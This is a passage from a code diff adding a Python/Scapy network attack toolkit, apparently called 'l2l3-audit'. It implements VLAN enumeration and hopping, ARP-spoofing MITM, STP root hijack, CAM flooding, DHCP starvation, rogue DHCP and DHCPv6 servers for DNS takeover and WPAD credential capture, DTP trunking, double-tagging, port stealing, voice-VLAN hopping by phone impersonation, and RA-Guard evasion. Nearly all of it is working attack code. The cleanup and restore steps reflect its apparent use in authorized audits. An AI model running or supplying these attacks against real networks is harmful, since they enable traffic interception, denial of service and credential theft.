+                            found["cdp_voice"] = v[-2:] and struct.unpack(
+                                "!H", v[-2:])[0]
+                        elif t == 0x0009:      # VTP domain (bleak intro)
+                            found.setdefault("vtp_domain",
+                                             v.decode(errors="replace"))
+                elif sn.code == 0x2003:  # VTP
+                    ctl_vtp(body)
+                elif sn.code == 0x2004:  # DTP
+                    found["dtp"] += 1
+                elif sn.code == 0x010B:  # PVST+ BPDU (tagged per VLAN)
+                    q = p.getlayer(Dot1Q)
+                    if q:
+                        found["pvst"].add(q.vlan)
+        if p.haslayer(UDP) and (p[UDP].dport in (546, 547)
+                                or p[UDP].sport in (546, 547)):
+            q = p.getlayer(Dot1Q)
+            if q:
+                found["dhcp6"].add(q.vlan)
+
+    print(f"[*] passive: {args.time}s leak collection (tags, CDP native/voice,"
+          " VTP db, PVST+, DTP)")
+    sniff(iface=pif, timeout=args.time, store=False, prn=pkt)
+
+    if args.active is not None:
+        if args.active:
+            vids = parse_vlan_list(args.active)
+        else:
+            vids = sorted(set(found["tags"]) | found["pvst"]
+                          | set(found["vtp"]))
+        if not vids:
+            print("[*] no candidate VLANs for active probing "
+                  "(passive leaks empty); pass --active 1,10-30,... to force")
+        else:
+            print(f"[*] active: tagged DHCP+RS probes on {len(vids)} "
+                  f"VLAN(s), {args.probe_window}s reply window")
+            stats, _ = active_vlan_probe(pif, vids, args.probe_window)
+            proven = [v for v, s in stats.items() if s["offer"]]
+            weak = [v for v, s in stats.items()
+                    if not s["offer"] and s["frames"]]
+            for v in sorted(set(proven + weak) | set(found["tags"])):
+                found["tags"].setdefault(v, 0)
+            if proven:
+                print(f"[!] DHCP PROOF: VLAN(s) "
+                      f"{', '.join(map(str, proven))} answered a tagged "
+                      "Discover - broadcast domains reachable from this "
+                      "port (misconfig)")
+            elif weak:
+                print(f"[*] tagged frames from VLAN(s) "
+                      f"{', '.join(map(str, weak))} in the window "
+                      "(no DHCP proof)")
+
+    print("\n================ VLAN ENUMERATION ================")
+    print("[*] leak report:")
+    if found["tags"]:
+        print(f"  tagged frames observed: " + ", ".join(
+            f"VLAN {v} ({c}x)" for v, c in sorted(found["tags"].items())))
+    else:
+        print("  no 802.1Q/QinQ tags seen (plain access port or stripped "
+              "egress)")
+    if found["cdp_native"] is not None:
+        print(f"  CDP native VLAN: {found['cdp_native']} "
+              "(outer tag for double-tagging)")
+    if found["cdp_voice"] is not None:
+        print(f"  CDP voice VLAN (VVID): {found['cdp_voice']} -> voicevlan")
+    if found["vtp"]:
+        n = ", ".join(f"VLAN {v} ({n_})" for v, n_ in
+                      sorted(found["vtp"].items())[:12])
+        print(f"  VTP subset-adv leaked {len(found['vtp'])} VLANs: {n}"
+              + (" ..." if len(found["vtp"]) > 12 else ""))
+    if found.get("vtp_domain"):
+        print(f"  VTP/C mgmt domain: {found['vtp_domain']} -> vtp")
+    if found["pvst"]:
+        print(f"  PVST+ per-VLAN BPDUs: trunk carries "
+              f"{', '.join(str(v) for v in sorted(found['pvst']))}")
+    if found["dtp"]:
+        print(f"  DTP frames: {found['dtp']} (negotiation ON -> dtp)")
+    cand = sorted(set(found["tags"]) | found["pvst"] | set(found["vtp"]))
+    if cand:
+        print(f"\n[*] next: l2l3-audit vlanhop --vlan {cand[0]}  "
+              f"(or each of {', '.join(map(str, cand))})")
+    elif found["dtp"]:
+        print("\n[*] next: l2l3-audit dtp (negotiate trunk), then vlanenum "
+              "again to harvest the trunk's VLAN list")
+    else:
+        print("\n[*] no VLAN leak: port is plain access. Try vlanenum "
+              "--active <range> if the port might forward tagged frames, or "
+              "voicevlan if phones exist")
+    return found
+
+
+# ---------------------------------------------------------------- vlanhop
+
+
+def vlanhop_cmd(args):
+    """Hijack a tagged VLAN: bring up IFACE.<vlan>, DHCP (or static) an
+    address, enumerate it, optionally MITM. Lifecycle: create -> use ->
+    (default) teardown."""
+    need_root()
+    pif = parent_of(args.iface)
+    sub = dst = None
+    created = False
+    try:
+        sub = vlan_up(pif, args.vlan)
+        created = True
+        print(f"[*] subinterface {sub} up (parent {pif}, 802.1Q id "
+              f"{args.vlan})")
+        if args.static:
+            dst = args.static.split("/")[0]
+            subprocess.run(["ip", "addr", "add", args.static, "dev", sub],
+                           capture_output=True)
+            print(f"[*] static address {args.static} on {sub}")
+        else:
+            dst, server = dhcp_discover_addr(sub, args.dhcp_timeout)
+            if not dst:
+                raise SystemExit(
+                    f"[!] no DHCP lease in VLAN {args.vlan} "
+                    f"({args.dhcp_timeout}s) - static? -> retry "
+                    f"with --static <ip>/<bits>, else VLAN may be "
+                    f"unreachable from this port")
+            print(f"[!] LEASED {dst} from {server} in VLAN {args.vlan} - "
+                  "bidirectional presence in the tagged VLAN proven")
+
+        gw = args.gateway or gateway_of(sub)
+        net = net_of(sub)
+        alive = []
+        if args.sweep and net:
+            print(f"[*] ARP sweep of {net} inside VLAN {args.vlan}")
+            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=net),
+                         iface=sub, timeout=3, verbose=0)
+            alive = sorted({r.psrc for s, r in ans
+                            if r.psrc != dst})
+            for s, r in ans:
+                print(f"    {r.psrc:<16} {r.hwsrc}")
+            print(f"[*] {len(ans)} hosts in VLAN {args.vlan}")
+        if args.mitm:
+            if not gw:
+                die("no gateway known for MITM; pass --gateway")
+            targets = [t for t in alive if t != gw] or [gw]
+            print(f"[*] MITM in VLAN {args.vlan}: {len(targets)} target(s)"
+                  f" <-> {gw} (Ctrl-C restores caches)")
+            ns = argparse.Namespace(iface=sub, targets=targets[:args.max],
+                                    gateway=gw)
+            arpspoof_cmd(ns)
+        else:
+            print(f"[*] attack in-VLAN with -i {sub}, e.g. "
+                  f"l2l3-audit -i {sub} arpspoof / roguedhcp / scan")
+            print(f"[*] holding VLAN {args.vlan} presence "
+                  f"({'persistent' if args.persist else 'Ctrl-C -> teardown'})")
+
+            def hold(stopped):
+                while not stopped():
+                    time.sleep(1)
+            stop_loop(hold)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        if created and not args.persist:
+            vlan_down(sub)
+            print(f"[*] {sub} torn down")
+        elif created and args.persist:
+            print(f"[*] {sub} left up (--persist); teardown: "
+                  f"ip link del {sub}")
+
+
+# ---------------------------------------------------------------- arpsweep
+
+
+def arpsweep_cmd(args):
+    need_root()
+    net = args.net or net_of(args.iface) or "172.16.0.0/24"
+    print(f"[*] ARP sweep {net} on {args.iface}")
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=net),
+                 iface=args.iface, timeout=args.timeout, verbose=0)
+    for s, r in ans:
+        print(f"  {r.psrc:<16} {r.hwsrc}")
+    print(f"[*] {len(ans)} hosts up")
+
+# ---------------------------------------------------------------- arpspoof
+
+
+def arpspoof_cmd(args):
+    need_root()
+    iface = args.iface
+    attacker = my_mac(iface)
+    gw = args.gateway or gateway_of(iface)
+    if not gw:
+        die("no gateway found; pass --gateway")
+    targets = args.targets or [gw]
+    old_fwd = get_ip_forward()
+    set_ip_forward(True)
+
+    macs = {}
+    for t in set(targets + [gw]):
+        m = resolve_mac(t, iface)
+        if not m:
+            set_ip_forward(old_fwd)
+            die(f"cannot resolve MAC for {t} on {iface}")
+        macs[t] = m
+
+    print(f"[*] poisoning on {iface} (attacker {attacker}); "
+          "watch effects on eth1 side / victim traffic")
+    for t in targets:
+        print(f"    {t} <-> {gw}")
+
+    def body(stopped):
+        try:
+            while not stopped():
+                for t in targets:
+                    sendp(Ether(dst=macs[t]) /
+                          ARP(op=2, psrc=gw, hwsrc=attacker, pdst=t,
+                              hwdst=macs[t]), iface=iface, verbose=0)
+                    if t != gw:
+                        sendp(Ether(dst=macs[gw]) /
+                              ARP(op=2, psrc=t, hwsrc=attacker, pdst=gw,
+                                  hwdst=macs[gw]), iface=iface, verbose=0)
+                time.sleep(1.0)
+        finally:
+            print("\n[*] restoring ARP caches...")
+            for t in targets:
+                sendp(Ether(dst=macs[t]) /
+                      ARP(op=2, psrc=gw, hwsrc=macs[gw], pdst=t,
+                          hwdst=macs[t]), iface=iface, count=4, verbose=0)
+                if t != gw:
+                    sendp(Ether(dst=macs[gw]) /
+                          ARP(op=2, psrc=t, hwsrc=macs[t], pdst=gw,
+                              hwdst=macs[gw]), iface=iface, count=4,
+                          verbose=0)
+            set_ip_forward(old_fwd)
+            print("[*] restored.")
+
+    stop_loop(body)
+
+# ---------------------------------------------------------------- stproot
+
+
+def stp_frames(m, prio, tag=None, pvst=True):
+    """Build superior-BPDU frame sets. Returns (untagged, tagged)."""
+    ext = tag or 0
+    bpdu = STP(proto=0, version=0, bpdutype=0, bpduflags=0x7E,
+               rootid=(prio << 8) | ext, rootmac=m, pathcost=0,
+               bridgeid=(prio << 8) | ext, bridgemac=m,
+               portid=0x8001, age=0, hellotime=1, maxage=6, fwddelay=4)
+    untagged = [Ether(dst="01:80:c2:00:00:00", src=m) /
+                LLC(dsap=0x42, ssap=0x42, ctrl=3) / bpdu]
+    tagged = []
+    if pvst:
+        untagged.append(Ether(dst="01:00:0c:cc:cc:cd", src=m) /
+                        LLC(dsap=0xAA, ssap=0xAA, ctrl=3) /
+                        SNAP(OUI=0x00000C, code=0x010B) / bpdu)
+    if tag:
+        tagged = [Ether(dst=f.dst, src=m) / Dot1Q(vlan=tag) / f.payload
+                  for f in untagged]
+    return untagged, tagged
+
+
+def stproot_cmd(args):
+    need_root()
+    pif = parent_of(args.iface)
+    m = my_mac(pif)
+    frames_untagged, frames_tagged = stp_frames(m, args.prio, tag=args.tag,
+                                                pvst=args.pvst)
+
+    print(f"[*] claiming STP root (prio {args.prio}) on {pif}"
+          + (f" + VLAN {args.tag} (PVST+ tagged)" if args.tag else "")
+          + "; Ctrl-C to stop. Compare root on watch leg.")
+    while True:
+        sendp(frames_untagged, iface=pif, verbose=0)
+        if frames_tagged:
+            sendp(frames_tagged, iface=pif, verbose=0)
+        time.sleep(args.interval)
+
+# ---------------------------------------------------------------- camflood
+
+
+def camflood_cmd(args):
+    need_root()
+    iface = args.iface
+    print(f"[*] CAM flood on {iface} ({args.count or 'unlimited'} frames) - "
+          "watch unknown-unicast flooding from eth1")
+    sock = conf.L2socket(iface=iface)
+    base = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(dst="255.255.255.255") / \
+        UDP(dport=9) / b"l2-flood"
+    sent = 0
+    try:
+        while not args.count or sent < args.count:
+            p = Ether(bytes(base))
+            p.src = rand_mac()
+            sock.send(p)
+            sent += 1
+            if sent % 5000 == 0:
+                print(f"    ... {sent}")
+    except KeyboardInterrupt:
+        pass
+    print(f"[*] sent {sent} frames")
+
+# ---------------------------------------------------------------- dhcpstarve
+
+
+def dhcpstarve_cmd(args):
+    need_root()
+    iface = args.iface
+    print(f"[*] DHCP starvation on {iface}: {args.count} discovers, "
+          "random MACs")
+    for i in range(args.count):
+        mac = rand_mac()
+        chaddr = int(mac.replace(":", ""), 16).to_bytes(6, "big") + b"\x00" * 10
+        p = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
+             IP(src="0.0.0.0", dst="255.255.255.255") /
+             UDP(sport=68, dport=67) /
+             BOOTP(chaddr=chaddr, xid=random.randint(0, 0xFFFFFFFF)) /
+             DHCP(options=[(DHCP_MT, "discover"), "end"]))
+        sendp(p, iface=iface, verbose=0)
+        if i % 100 == 0:
+            print(f"    ... {i}/{args.count}")
+        time.sleep(args.delay)
+    print("[*] done. Alternate: dhcpig -i " + iface +
+          " (installed). Verify pool exhaustion on the server.")
+
+# ---------------------------------------------------------------- roguedhcp
+
+
+def roguedhcp_cmd(args):
+    need_root()
+    iface = args.iface
+    gw = args.offer_gw or my_ip(iface)
+    dns = args.offer_dns or gw
+    base, start = args.pool.rsplit(".", 1)
+    start = int(start.split("/")[0])
+    macs = {}
+
+    print(f"[*] rogue DHCP on {iface}: pool {base}.{start}+ gw={gw} dns={dns}")
+
+    def build(mt, req, yiaddr):
+        return (Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac(iface)) /
+                IP(src=gw, dst="255.255.255.255") /
+                UDP(sport=67, dport=68) /
+                BOOTP(op=2, yiaddr=yiaddr, siaddr=gw,
+                      chaddr=req[BOOTP].chaddr, xid=req[BOOTP].xid) /
+                DHCP(options=[(DHCP_MT, mt), ("server_id", gw),
+                              ("lease_time", 1800),
+                              ("subnet_mask", "255.255.255.0"),
+                              ("router", gw),
+                              (DHCP_DNS, dns), "end"]))
+
+    def pkt(p):
+        if not (p.haslayer(BOOTP) and p.haslayer(DHCP)):
+            return
+        mt = next((o[1] for o in p[DHCP].options
+                   if isinstance(o, tuple) and o[0] == DHCP_MT), None)
+        client = ":".join(f"{b:02x}" for b in p[BOOTP].chaddr[:6])
+        if mt == 1:
+            yi = macs.setdefault(client, f"{base}.{start + len(macs)}")
+            print(f"  < DISCOVER {client} -> OFFER {yi}")
+            sendp(build(2, p, yi), iface=iface, verbose=0)
+        elif mt == 3 and client in macs:
+            print(f"  < REQUEST  {client} -> ACK {macs[client]}")
+            sendp(build(5, p, macs[client]), iface=iface, verbose=0)
+
+    old_fwd = get_ip_forward()
+    set_ip_forward(True)
+    try:
+        sniff(iface=iface, filter="udp port 67 or 68", store=False, prn=pkt)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        set_ip_forward(old_fwd)
+
+# ---------------------------------------------------------------- dtp
+
+
+def dtp_cmd(args):
+    need_root()
+    pif = parent_of(args.iface)
+    m = my_mac(pif)
+    mode = {"desirable": 0x03, "trunk": 0x81, "auto": 0x04}[args.mode]
+    f = dtp_frame(m, mode=mode)
+    print(f"[*] DTP {args.mode} (status 0x{mode:02x}) on {pif} every "
+          f"{args.interval}s.")
+    print("    Verify success in another shell: vlanenum watches for "
+          "PVST+/tagged frames (port flipped to trunk). Then vlanhop per "
+          "VLAN. Ctrl-C stops (state_CHANGE: trunk persists until flap or "
+          "DTP access frame)")
+    if args.restore:
+        print("[*] --restore: sending DTP access (0x02) on exit")
+    try:
+        while True:
+            sendp(f, iface=pif, verbose=0)
+            time.sleep(args.interval)
+    except KeyboardInterrupt:
+        if args.restore:
+            sendp(dtp_frame(m, mode=0x02), iface=pif, count=3, inter=1,
+                  verbose=0)
+            print("\n[*] DTP access restore frames sent")
+
+# ---------------------------------------------------------------- doubletag
+
+
+def doubletag_cmd(args):
+    need_root()
+    pif = parent_of(args.iface)
+    # TPID matrix: 0x8100 classic, 0x88a8 (802.1ad S-tag) confuses some
+    # provider-edge/native-strip paths, 0x9100 legacy vendor tag.
+    tag_layers = []
+    outer = Dot1Q(vlan=args.outer, prio=args.prio)
+    f = Ether(dst=args.dst_mac, src=my_mac(pif), type=args.outer_tpid) / outer
+    tag_layers.append(outer)
+    inner = Dot1Q(vlan=args.vlan, prio=args.prio)
+    f = f / inner
+    if args.probe == "arp":
+        f = f / ARP(pdst=args.target)
+    elif args.probe == "udp":
+        f = f / IP(dst=args.target) / UDP(dport=args.port) / \
+            f"doubletag->v{args.vlan}".encode()
+    else:
+        f = f / IP(dst=args.target) / ICMP() / \
+            f"doubletag->v{args.vlan}".encode()
+    print(f"[*] double-tag {args.outer}->v{args.vlan} via {pif} "
+          f"tc {args.prio} | outer TPID 0x{args.outer_tpid:04x} "
+          f"(0x8100 classic / 0x88a8 QinQ / 0x9100 vendor-legacy)")
+    print(f"    x{args.count} {args.probe.upper()} -> {args.target}; "
+          "verify landing via SPAN capture or marker host - "
+          "one-way by nature (replies never leave VLAN "
+          f"{args.vlan}; use dtp+vlanhop for a bidirectional hop)")
+    sendp(f, iface=pif, count=args.count, inter=args.interval, verbose=0)
+    print("[*] done. Bidirectional reality check: NotSoSecure's forged "
+          "SYN-ACK path is dead (RFC 6528 ISN) - replies stay in the target "
+          "VLAN; genuine hop = vlanhop after dtp, or marker host callback")
+
+
+# ---------------------------------------------------------------- portsteal
+
+
+def portsteal_cmd(args):
+    need_root()
+    iface = args.iface
+    attacker = my_mac(iface)
+    if args.victim_mac:
+        vmac = args.victim_mac.lower()
+    else:
+        vmac = resolve_mac(args.victim, iface)
+        if not vmac:
+            die(f"cannot resolve MAC of {args.victim}; pass --victim-mac")
+        vmac = vmac.lower()
+    print(f"[*] port stealing on {iface}: capture traffic destined {vmac}")
+    print("    (race-origin technique: steal CAM entry, provoke victim "
+          "frame, relay buffer, repeat)")
+    print(f"    steal frame: Ether(src={vmac}) @ {args.rate}pkt/s - short "
+          "victim reachability loss is the proof")
+    captured = []
+    captured_total = [0]
+    stop = threading.Event()
+
+    def grab(p):
+        if p.haslayer(Ether) and p[Ether].dst.lower() == vmac \
+                and p[Ether].src.lower() != attacker:
+            captured.append(bytes(p[Ether]))
+            captured_total[0] += 1
+            if len(captured) % 10 == 0:
+                print(f"    ...{len(captured)} victim-destined frames "
+                      "captured (CAM entry stolen)")
+
+    sn = AsyncSniffer(iface=iface, prn=grab)
+    sn.start()
+    steal = (Ether(src=vmac, dst=vmac) / IP(dst="255.255.255.255") /
+             Raw(b" "))
+    provoke = None
+    if args.victim:
+        provoke = (Ether(dst=vmac, src=attacker) /
+                   IP(dst=args.victim) / ICMP() / b"l2l3-steal")
+    sock = conf.L2socket(iface=iface)
+    gap = max(0.001, 1.0 / args.rate)
+    try:
+        for _ in range(args.duration):
+            t0 = time.time()
+            # 1) steal burst
+            end = t0 + args.steal_time
+            while time.time() < end:
+                sock.send(steal)
+                time.sleep(gap)
+            # 2) provoke a victim egress frame -> CAM re-learns real port
+            if provoke is not None:
+                sock.send(provoke)
+                time.sleep(0.02)
+            # 3) relay buffered frames while the CAM is honest
+            if args.relay and captured:
+                for b in captured:
+                    sock.send(Ether(b))
+                print(f"    {len(captured)} frames relayed to victim")
+                captured.clear()
+    except KeyboardInterrupt:
+        pass
+    finally:
+        stop.set()
+        sn.stop()
+        # let CAM settle back: provoke victim + stop stealing
+        if provoke is not None:
+            sendp(provoke, iface=iface, count=3, inter=0.1, verbose=0)
+    print(f"[*] stopped: {captured_total[0]} victim-destined frames "
+          f"captured across {args.duration} cycle(s). "
+          "Finding: port-security not enforcing sticky-MAC / no "
+          "802.1X MAB isolation - combine with -w leg to demo full MITM")
+    return captured_total[0]
+
+# ---------------------------------------------------------------- voicevlan
+
+
+def cdp_tlv(t, v):
+    return struct.pack("!HH", t, 4 + len(v)) + v
+
+
+def cdp_frame(m, tlvs, ttl=180):
+    """CDPv2 frame + correct 16-bit one's-complement checksum."""
+    body = struct.pack("!BBH", 2, ttl, 0) + tlvs
+    if len(body) % 2:
+        body += b"\x00"
+    s = 0
+    for i in range(0, len(body), 2):
+        s += (body[i] << 8) | body[i + 1]
+    s = (s >> 16) + (s & 0xFFFF)
+    s = (s >> 16) + (s & 0xFFFF)
+    body = struct.pack("!BBH", 2, ttl, (~s) & 0xFFFF) + tlvs
+    return (Ether(dst="01:00:0c:cc:cc:cc", src=m) /
+            LLC(dsap=0xAA, ssap=0xAA, ctrl=3) /
+            SNAP(OUI=0x00000C, code=0x2000) / body)
+
+
+def cdp_phone_frame(m):
+    """Impersonate a Cisco 7940-era phone (VoIP Hopper lineage)."""
+    devid = ("SEP" + m.replace(":", "").upper()).encode()
+    tlvs = (cdp_tlv(0x0001, devid) +
+            cdp_tlv(0x0003, b"Port 2") +
+            cdp_tlv(0x0004, struct.pack("!I", 0x90)) +      # Host|Phone
+            cdp_tlv(0x0005, b"SIP41.9-4-2SR3S") +
+            cdp_tlv(0x0006, b"Cisco IP Phone 7940") +
+            cdp_tlv(0x000F, b"\x00\x00\x00"))              # VoIP VLAN Query
+    return cdp_frame(m, tlvs)
+
+
+def lldp_phone_frame(m, vvid):
+    """LLDP-MED Network Policy TLV claiming voice in VLAN vvid.
+    MED NP value: apptype(1)=1 voice, then 16b = U|T|X|VLAN-ID(12),
+    L2-prio byte, DSCP byte (TIA-1057)."""
+    policy = struct.pack("!BHBB", 1, 0x4000 | (vvid & 0x0FFF), 0xA0, 0x2E)
+    org = LLDPDUGenericOrganisationSpecific
+    med = 0x0012BB
+    l = (Ether(dst="01:80:c2:00:00:0e", src=m, type=0x88CC) /
+         LLDPDU() /
+         LLDPDUChassisID(subtype=4, id=m) /
+         LLDPDUPortID(subtype=5, id="1") /
+         LLDPDUTimeToLive(ttl=180) /
+         org(org_code=med, subtype=1, data=b"\x13\x00\x03") /
+         org(org_code=med, subtype=2, data=policy) /
+         LLDPDUEndOfLLDPDU())
+    return l
+
+
+def voicevlan_cmd(args):
+    """Voice VLAN abuse: discover VVID passively (CDP appliance TLV /
+    LLDP-MED network policy), impersonate a phone, hop onto the VVID,
+    prove with a lease, release on exit. VVID is trusted-for-phones and
+    frequently remains un-802.1Xed - classic NAC gap (VoIP Hopper line)."""
+    need_root()
+    pif = parent_of(args.iface)
+    m = my_mac(pif)
+    vvid = args.vvid
+    if vvid is None:
+        print(f"[*] sniffing {args.time}s for voice VLAN leaks "
+              "(CDP 0x000E / LLDP-MED policy)... send CDP query too")
+        leaks = {}
+
+        def listen(p):
+            try:
+                dp = Dot3(bytes(p))
+            except Exception:
+                dp = p
+            if dp.haslayer(SNAP) and getattr(dp[SNAP], "OUI", 0) == 0x00000C \
+                    and dp[SNAP].code == 0x2000:
+                for t, v in parse_tlvs(bytes(dp[SNAP].payload)[4:]):
+                    if t == 0x000E and len(v) >= 3:
+                        leaks["vvid"] = struct.unpack("!H", v[-2:])[0]
+            raw = bytes(p)
+            i = raw.find(b"\x00\x12\xbb\x02")
+            if i >= 0 and i + 4 <= len(raw):
+                vidb = struct.unpack("!H", raw[i + 2:i + 4])[0]
+                leaks["vvid"] = vidb & 0x0FFF
+
+        sendp(cdp_phone_frame(m), iface=pif, verbose=0)
+        sniff(iface=pif, timeout=args.time, store=False, prn=listen)
+        vvid = leaks.get("vvid")
+        if not vvid:
+            die("no voice VLAN leak seen; pass --vvid explicitly if known")
+        print(f"[*] voice VLAN discovered: {vvid}")
+    sub = None
+    dst = None
+    stop = threading.Event()
+    try:
+        print(f"[*] impersonating a Cisco IP phone (proto {args.proto}) + "
+              f"hopping onto VLAN {vvid}")
+        frames = ([cdp_phone_frame(m)] if args.proto in ("cdp", "both")
+                  else []) + \
+                 ([lldp_phone_frame(m, vvid)] if args.proto in
+                  ("lldp", "both") else [])
+
+        def spoof():
+            while not stop.wait(5):
+                sendp(frames, iface=pif, verbose=0)
+        sp = threading.Thread(target=spoof, daemon=True)
+        sp.start()
+        sendp(frames, iface=pif, verbose=0)
+
+        sub = vlan_up(pif, vvid)
+        dst, server = dhcp_discover_addr(sub, args.dhcp_timeout)
+        if not dst:
+            print(f"[!] no lease in voice VLAN {vvid} - phone impersonation "
+                  "did NOT convince the switch (802.1X/MVA enforced?)")
+        else:
+            print(f"[!] VOICE VLAN HOPPED: leased {dst} from {server} in "
+                  f"VLAN {vvid} - trusted phone surface open from an "
+                  "attacker host (no 802.1X on VVID / MVA off?)")
+        print(f"[*] holding {sub} for {args.hold}s then releasing "
+              "(release+teardown is the audit-friendly path)")
+        time.sleep(args.hold)
+    finally:
+        stop.set()
+        if dst:
+            subprocess.run(["dhclient", "-x", sub], capture_output=True)
+        if sub and not args.persist:
+            vlan_down(sub)
+            print(f"[*] {sub} torn down")
+
+
+# ---------------------------------------------------------------- roguedhcp6
+
+
+def roguedhcp6_cmd(args):
+    """Rogue DHCPv6 (mitm6, Fox-IT 2018 recipe): race Solicits, hand out a
+    fe80:: address built from the victim's own IPv4 (traceable) with 300s
+    lifetimes (rollback-safe), and our link-local as DNS (opt 23). Windows
+    prefers IPv6 DNS -> full DNS take-over -> wpad/proxy auth capture."""
+    need_root()
+    iface = args.iface
+    mymac = my_mac(iface)
+    ll = my_ll6(iface)
+    dns6 = args.dns6 or ll
+    server_duid = DUID_LL(lladdr=mymac)
+    print(f"[*] rogue DHCPv6 on {iface}: DNS={dns6}, leases 300s in fe80:: "
+          "(self-expiring rollback) - Windows victims prefer IPv6 DNS")
+    print("    harvesting side: run a DNS server here & WPAD proxy "
+          "- Solicits/Requests only touched, "
+          + ("steering RAs ON" if args.ra else "no unsolicited RAs"))
+
+    stop = threading.Event()
+    if args.ra:
+        ra_f = (Ether(src=mymac, dst="33:33:00:00:00:01") /
+                IPv6(src=ll, dst="ff02::1", hlim=255) /
+                ICMPv6ND_RA(chlim=64, M=1, O=1, routerlifetime=0) /
+                ICMPv6NDOptSrcLLAddr(lladdr=mymac))
+
+        def ra_loop():
+            while not stop.wait(30):
+                sendp(ra_f, iface=iface, verbose=0)
+        threading.Thread(target=ra_loop, daemon=True).start()
+
+    leases = {}
+
+    def v4_map(src_ll):
+        """RFC-mitm6: if src is IPv6 form of mapped IPv4 reuse, else hash."""
+        h = hashlib.sha256(src_ll.encode()).hexdigest()
+        return f"fe80::{int(h[:4], 16):x}:{int(h[4:8], 16):x}"
+
+    def eth_mac(p):
+        return p[Ether].src.lower() if p.haslayer(Ether) else None
+
+    def answer(p):
+        if not (p.haslayer(IPv6) and p.haslayer(UDP)):
+            return
+        wants_s = p.haslayer(DHCP6_Solicit)
+        wants_r = (p.haslayer(DHCP6_Request)
+                   or p.getlayer("DHCP6_Renew") is not None)
+        if not (wants_s or wants_r):
+            return
+        if p[IPv6].src == ll or eth_mac(p) == mymac.lower():
+            return
+        if wants_s:
+            upper = p[DHCP6_Solicit]
+        elif p.haslayer(DHCP6_Request):
+            upper = p[DHCP6_Request]
+        else:
+            upper = p.getlayer("DHCP6_Renew")
+        trid = upper.trid
+        # echo client id, detect server id targeting
+        cid_opt = None
+        sid_opt = None
+        ia_na = None
+        opt_l = upper.payload
+        while opt_l and opt_l.name != "NoPayload":
+            if isinstance(opt_l, DHCP6OptClientId):
+                cid_opt = opt_l
+            elif isinstance(opt_l, DHCP6OptServerId):
+                sid_opt = opt_l
+            elif isinstance(opt_l, DHCP6OptIA_NA):
+                ia_na = opt_l
+            opt_l = opt_l.payload
+        if cid_opt is None:
+            return
+        if sid_opt is not None and wants_r:
+            # only answer requests aimed at us
+            if bytes(sid_opt.duid) != bytes(server_duid):
+                return
+        ckey = bytes(cid_opt.duid).hex()
+        addr = leases.get(ckey)
+        if not addr:
+            addr = v4_map(f"{ckey}-{eth_mac(p) or ''}")
+            leases[ckey] = addr
+        iaaddr = DHCP6OptIAAddress(addr=addr, preflft=300, validlft=300)
+        reply_opts = [
+            DHCP6OptClientId(duid=cid_opt.duid),
+            DHCP6OptServerId(duid=DUID_LL(lladdr=mymac)),
+        ]
+        if ia_na is not None:
+            reply_opts.append(DHCP6OptIA_NA(iaid=ia_na.iaid, T1=150, T2=240,
+                                            ianaopts=[iaaddr]))
+        else:
+            reply_opts.append(DHCP6OptIA_NA(ianaopts=[iaaddr]))
+        reply_opts.append(DHCP6OptDNSServers(dnsservers=[dns6]))
+        if args.domain:
+            reply_opts.append(DHCP6OptDNSDomains(dnsdomains=[args.domain]))
+        if wants_s:
+            msg = DHCP6_Advertise(trid=trid)
+        else:
+            msg = DHCP6_Reply(trid=trid)
+        out = (Ether(src=mymac, dst=p[Ether].src) /
+               IPv6(src=ll, dst=p[IPv6].src) /
+               UDP(sport=547, dport=546) / msg)
+        for o in reply_opts:
+            out = out / o
+        sendp(out, iface=iface, verbose=0)
+        kind = "ADVERTISE" if wants_s else "REPLY"
+        print(f"  > {kind} to {p[IPv6].src}: iaaddr {addr}, dns {dns6}")
+
+    try:
+        sniff(iface=iface, filter="udp port 547 or udp port 546",
+              timeout=args.time or None, store=False, prn=answer)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        stop.set()
+    print(f"[*] stopped; {len(leases)} lease(s) issued (self-expire in "
+          "~300s; victims recover via next Windows renewal)")
+    return leases
+
+
+# ---------------------------------------------------------------- raguard
+
+
+def raguard_cmd(args):
+    """RA-Guard efficacy probe (RFC 7113 §2 evasion recipes, RFC 6980
+    drop expectation): RA hidden behind a Destination-Options header +
+    IPv6 fragmentation. Carousel effect is harmless: doc-space prefix
+    2001:db8::/32, routerlifetime=60, quick self-expiry."""
+    need_root()
+    iface = args.iface
+    mymac = my_mac(iface)
+    ll = my_ll6(iface)
+    modes = ["chain"] if args.mode == "chain" else \
+        ["frag"] if args.mode == "frag" else ["plain", "chain", "frag"]
+    print(f"[*] RA-Guard probe on {iface}: modes {', '.join(modes)} "
+          f"(prefix {args.prefix}/64 doc-space, lifetime 60s)")
+    print("    validate on a victim: 'ip -6 route' / 'sysctl "
+          "net.ipv6.conf.*.accept_ra' - the RA should only install when "
+          "RA-Guard/RA-snooping fails")
+    ra_base = ICMPv6ND_RA(chlim=64, M=0, O=1, routerlifetime=60)
+    for mode in modes:
+        eth = (Ether(src=mymac, dst="33:33:00:00:00:01") /
+               IPv6(src=ll, dst="ff02::1", hlim=255))
+        opts = (ICMPv6NDOptPrefixInfo(prefixlen=64, L=1, A=1,
+                                      validlifetime=300,
+                                      preferredlifetime=200,
+                                      prefix=args.prefix) /
+                ICMPv6NDOptRDNSS(lifetime=180, dns=[ll]))
+        if mode == "plain":
+            p = eth / ra_base / ICMPv6NDOptSrcLLAddr(lladdr=mymac) / opts
+            label = "plain RA (control - guard MUST drop on untrusted port)"
+            frags = [p]
+        elif mode == "chain":
+            p = eth.copy()
+            p[IPv6].nh = 60
+            p = (p / IPv6ExtHdrDestOpt(nh=58) / ra_base /
+                 ICMPv6NDOptSrcLLAddr(lladdr=mymac) / opts)
+            label = "RA behind Destination-Options (RFC 7113 §2.1)"
+            frags = [p]
+        else:
+            p = eth.copy()
+            p[IPv6].nh = 60
+            inner = (IPv6ExtHdrDestOpt(nh=58) / ra_base /
+                     ICMPv6NDOptSrcLLAddr(lladdr=mymac) / opts)
+            p = p / inner
+            frags = fragment6(p, args.frag_len)
+            label = (f"RA behind DestOpt + fragment split @"
+                     f"{args.frag_len} (RFC 7113 §2.2; 6980 says DROP)")
